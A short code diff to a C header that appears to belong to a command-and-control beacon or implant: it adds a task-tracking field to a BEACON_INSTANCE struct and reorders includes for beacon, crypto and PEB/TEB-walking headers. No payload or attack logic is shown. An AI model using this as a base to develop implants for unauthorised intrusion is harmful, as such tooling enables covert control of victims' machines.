@@ -21,6 +21,7 @@ typedef struct
 {
 	BOOL	IsOnline;
 	ULONG	BeaconId;
+	ULONG	LastTask;
 	UCHAR	BeaconKeys[ 16 ];
 
 	struct
@@ -82,6 +83,8 @@ typedef struct
 	SOCKET	Socket;
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
+#include "beacon_core.h"
+#include "beacon_task.h"
 #include "crypt/hmac.h"
 #include "crypt/rsa.h"
 #include "crypt/aes.h"
@@ -89,7 +92,6 @@ typedef struct
 #include "random.h"
 #include "sha256.h"
 #include "tebpeb.h"
-#include "beacon.h"
 #include "buffer.h"
 #include "hash.h"
 #include "peb.h"
